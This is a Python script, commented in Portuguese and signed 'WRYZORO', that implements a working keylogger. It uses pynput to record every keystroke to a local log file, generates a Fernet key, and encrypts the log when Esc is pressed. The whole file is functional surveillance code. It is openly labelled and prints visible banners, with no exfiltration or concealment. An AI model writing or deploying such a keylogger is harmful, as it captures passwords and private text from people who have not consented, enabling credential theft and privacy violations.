from pynput import keyboard
import os
import time
from cryptography.fernet import Fernet



## ######################################################### ##
## ######################################################### ##
## ###########         KEYLOGGER        ########### ######## ##
## ######################################################### ##
## ######################################################### ##



# Vai gerar uma chave e salva-la num ficheiro encriptado ( dá run para criar o ficherio da chave)
KEY_FILE = "key.key"
LOG_FILE = "key_log.txt"

if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)

# Dar load a encriptação
def load_key():
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

encryption_key = load_key()
fernet = Fernet(encryption_key)

# Inicialização do ficheiro
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as log_file:
        log_file.write("Keylogger initialized at: " + time.ctime() + "\n\n")

# Função para dar log (opcional, keystrokes)
def log_keystroke(key):
    try:
        with open(LOG_FILE, 'a') as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Função para encriptar o ficheiro LOG
def encrypt_log():
    with open(LOG_FILE, 'rb') as log_file:
        data = log_file.read()
    encrypted_data = fernet.encrypt(data)
    with open(LOG_FILE, 'wb') as log_file:
        log_file.write(encrypted_data)

# Listener dos keystrokes
def on_press(key):
    if key == keyboard.Key.esc:  # Use Esc key as a stop mechanism
        encrypt_log()
        return False  # Stops the listener
    log_keystroke(key)

# Main Função do keylogger
def start_keylogger():
    print("###############################################################")
    print("#                                                             #")
    print("#                  KEYLOGGER INICIADO                        #")
    print("#                                                             #")
    print("#     Pressione 'Esc' para parar e encriptar o log            #")
    print("#                                                             #")
    print("###############################################################\n")
    
    print("[INFO] Keylogger está ativo e capturando teclas...\n")
    print("[INFO] As teclas serão registradas no arquivo de log.")
    print("[INFO] Pressione 'Esc' para finalizar.\n")

    # Inicia o listener do teclado
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print("\n###############################################################")
    print("#                                                               #")
    print("#                 KEYLOGGER FINALIZADO                          #")
    print("#                                                               #")
    print("#      O log foi encriptado com sucesso!                        #")
    print("###############################################################")


if __name__ == "__main__":
    start_keylogger()

## ######################################################### ##
## ###########         WRYZORO          ########### ######## ##
## ######################################################### ##